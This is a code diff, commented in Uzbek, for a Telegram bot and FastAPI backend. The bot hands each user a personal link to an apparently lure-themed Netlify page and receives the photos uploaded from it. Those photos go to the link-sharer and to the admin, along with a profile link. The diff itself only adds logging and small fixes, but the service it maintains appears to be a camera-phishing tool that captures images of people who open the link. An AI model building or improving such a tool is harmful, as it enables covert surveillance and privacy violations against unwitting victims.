@@ -1,6 +1,7 @@
 import base64
 from contextlib import asynccontextmanager
 import json
+import logging
 import os
 from pathlib import Path
 import uuid
@@ -25,6 +26,12 @@ from telegram.ext import (
     filters,
 )
 
+# Terminalda loglarni ko'rish uchun logging
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO,
+)
+
 load_dotenv()
 
 TOKEN = os.getenv("BOT_TOKEN")
@@ -35,10 +42,9 @@ if not TOKEN:
 if not ADMIN_ID_RAW:
     raise RuntimeError("ADMIN_ID kiritilmagan!")
 
-ADMIN_ID = int(ADMIN_ID_RAW)
+ADMIN_ID = int(ADMIN_ID_RAW.strip())
 NETLIFY_URL = "https://gemini18oytekin.netlify.app"
 
-# --- Foydalanuvchilarni saqlash bazasi ---
 USERS_FILE = Path("users.json")
 
 
@@ -56,18 +62,19 @@ def save_user(user_id: int):
         users = load_users()
         users.add(user_id)
         USERS_FILE.write_text(json.dumps(list(users)))
-    except Exception:
-        pass
+    except Exception as e:
+        logging.error(f"Foydalanuvchini saqlashda xatolik: {e}")
 
 
 BROADCAST_STATE = {}
 
-tg_app = Application.builder().token(TOKEN).build()
+tg_app = Application.builder().token(TOKEN.strip()).build()
 
 
 # --- /start buyrug'i ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    logging.info(f">>> /start buyrug'i keldi! User ID: {user_id}")
     save_user(user_id)
 
     # 1. ADMIN UCHUN KLAVIATURA TUGMALARI
@@ -80,7 +87,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [KeyboardButton("📊 Statistika")],
         ]
         reply_markup = ReplyKeyboardMarkup(
-            keyboard, resize_keyboard=True, persistent=True
+            keyboard, resize_keyboard=True, is_persistent=True
         )
         await update.message.reply_text(
             "👑 **Xush kelibsiz, Admin!**\n\nPastdagi menyudan kerakli bo'limni tanlang:",
@@ -92,7 +99,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         keyboard = [[KeyboardButton("📸 Rasmga olish linki")]]
         reply_markup = ReplyKeyboardMarkup(
-            keyboard, resize_keyboard=True, persistent=True
+            keyboard, resize_keyboard=True, is_persistent=True
         )
         await update.message.reply_text(
             "Salom! 👋\n\nXizmatdan foydalanish uchun pastdagi **'📸 Rasmga olish linki'** tugmasini bosing.",
@@ -105,6 +112,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text
+    logging.info(f">>> Tugma bosildi! User ID: {user_id}, Matn: {text}")
 
     # Admin xabar yuborish rejimida bo'lsa
     if user_id == ADMIN_ID and BROADCAST_STATE.get(user_id):
@@ -131,7 +139,6 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # A) Rasmga olish linki
     if text == "📸 Rasmga olish linki":
         personal_link = f"{NETLIFY_URL}/?uid={user_id}"
         inline_kb = InlineKeyboardMarkup(
@@ -142,7 +149,6 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=inline_kb,
         )
 
-    # B) Admin: Statistika
     elif text == "📊 Statistika" and user_id == ADMIN_ID:
         users = load_users()
         await update.message.reply_text(
@@ -150,11 +156,10 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown",
         )
 
-    # C) Admin: Xabar yuborish
     elif text == "📢 Xabar yuborish" and user_id == ADMIN_ID:
         BROADCAST_STATE[user_id] = True
         await update.message.reply_text(
-            "📝 Barcha foydalanuvchilarga yubormoqchi bo'lgan xabaringizni (matn, rasm yoki video) shu yerga kiriting:\n\n*(Bekor qilish uchun shunchaki boshqa tugmani bosing)*"
+            "📝 Barcha foydalanuvchilarga yubormoqchi bo'lgan xabaringizni shu yerga kiriting:"
         )
 
 
@@ -164,14 +169,14 @@ tg_app.add_handler(
 )
 
 
-# FastAPI va Botni ishga tushirish
 @asynccontextmanager
 async def lifespan(app: FastAPI):
+    logging.info(">>> Bot ishga tushmoqda...")
     await tg_app.initialize()
-    # Eski webhooklarni tozalash (Bot javob bermasligini oldini oladi)
     await tg_app.bot.delete_webhook(drop_pending_updates=True)
     await tg_app.start()
     await tg_app.updater.start_polling()
+    logging.info(">>> Bot muvaffaqiyatli polling rejimiga o'tdi!")
     yield
     await tg_app.updater.stop()
     await tg_app.stop()
@@ -188,7 +193,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-bot = Bot(TOKEN)
+bot = Bot(TOKEN.strip())
 UPLOADS = Path("uploads")
 UPLOADS.mkdir(exist_ok=True)
 
@@ -203,7 +208,6 @@ async def health():
     return {"ok": True}
 
 
-# --- Rasm qabul qilish ---
 @app.post("/upload")
 async def upload(photo: Photo):
     if photo.uid <= 0:
@@ -227,7 +231,6 @@ async def upload(photo: Photo):
     bot_link = f"https://t.me/{bot_info.username}"
 
     try:
-        # Foydalanuvchiga rasm va botga qaytish tugmasi
         user_keyboard = InlineKeyboardMarkup(
             [[InlineKeyboardButton("🤖 Botga qaytish", url=bot_link)]]
         )
@@ -239,7 +242,6 @@ async def upload(photo: Photo):
                 reply_markup=user_keyboard,
             )
 
-        # Adminga rasm va user profiliga o'tish tugmasi
         admin_keyboard = InlineKeyboardMarkup(
             [[
                 InlineKeyboardButton(
